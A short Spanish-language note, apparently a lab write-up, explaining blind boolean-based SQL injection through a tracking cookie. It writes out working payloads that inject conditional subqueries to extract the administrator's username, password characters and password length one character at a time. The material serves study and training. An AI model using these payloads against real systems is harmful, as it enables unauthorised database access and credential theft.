## Notas sobre la técnica de inyección SQL ciega usada

El ataque se basa en usar **consultas anidadas (nested queries)** y comparar resultados con valores específicos para extraer información carácter por carácter mediante respuestas condicionales.

### Ejemplo básico de comparación con nested query

(select 'a') = 'a'

Esto devuelve `true`. Se usa para comparar si una subconsulta devuelve un valor específico.

### Validación del nombre de usuario carácter por carácter

Para saber si el primer carácter del usuario `administrator` es `'a'`:

(select substring(username, 1, 1) from users where username='administrator') = 'a'

Esto se traduce en la cookie:

TrackingId=ua4L8MnfGDQiYRX5' and (select substring(username,1,1) from users where username='administrator')='a'-- -

Si la respuesta es positiva, sabemos que el primer carácter es `'a'`.

De forma similar, para el segundo carácter que es `'d'`:

(select substring(username, 2, 1) from users where username='administrator') = 'd'

### Extracción de la contraseña

Se puede aplicar la misma técnica para la contraseña, por ejemplo para el segundo carácter:

(select substring(password, 2, 1) from users where username='administrator') = 'd'

### Comprobar la longitud de la contraseña

Podemos validar la longitud con una consulta condicional:

(select 'a' from users where username='administrator' and length(password) = 20) = 'a'

Y se inserta en la cookie:

TrackingId=ua4L8MnfGDQiYRX5' and (select 'a' from users where username='administrator' and length(password)=20)='a'-- -

---

Con estas comprobaciones iterativas y condicionales, el script realiza la fuerza bruta para descubrir la contraseña completa.
